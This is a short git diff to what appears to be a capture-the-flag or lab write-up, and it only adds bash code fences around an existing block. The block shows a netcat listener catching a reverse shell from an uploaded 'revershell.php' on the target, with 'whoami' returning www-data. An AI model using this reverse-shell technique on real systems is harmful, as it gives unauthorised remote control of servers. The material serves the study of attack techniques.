@@ -332,7 +332,8 @@ User www-data may run the following commands on 42905e333fcc:
 + Now run the revershell.php to nc listner:
 	"<IP>/revershell.php"
 	---------------------
-	# nc -lvnp 1234
+	```bash
+	 nc -lvnp 1234
 	Listening on 0.0.0.0 1234
 	Connection received on 10.10.117.90 54720
 	Linux 42905e333fcc 4.15.0-96-generic #97-Ubuntu SMP Wed Apr 1 03:25:46 UTC 2020 x86_64 GNU/Linux
@@ -342,6 +343,7 @@ User www-data may run the following commands on 42905e333fcc:
 	sh: 0: can't access tty; job control turned off
 	$ whoami
 	www-data
+	```
 -> Success !!!
 
 ```bash
